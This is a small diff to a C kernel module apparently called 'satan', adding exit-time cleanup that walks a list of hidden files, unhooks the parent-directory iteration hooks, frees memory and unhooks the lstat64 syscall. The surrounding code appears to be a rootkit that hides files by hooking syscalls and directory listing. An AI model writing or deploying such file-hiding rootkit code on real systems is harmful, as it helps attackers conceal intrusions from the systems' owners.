@@ -148,6 +148,22 @@ int satan_file_init(void)
 
 int satan_file_exit(void)
 {
+        struct hidden_file *f = NULL;
+        struct list_head *p = NULL;
+        struct list_head *tmp = NULL;
+
+        list_for_each_safe(p, tmp, &hidden_files) {
+                f = list_entry(p, struct hidden_file, list);
+                satan_file_unhook_parent_dir_iterate_shared(f);
+
+                pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
+                list_del(p);
+                kfree(f->fullpath);
+                kfree(f->basename);
+                kfree(f->filename);
+                kfree(f);
+        }
+
         return satan_syscall_unhook(__NR_lstat64);
 }
 
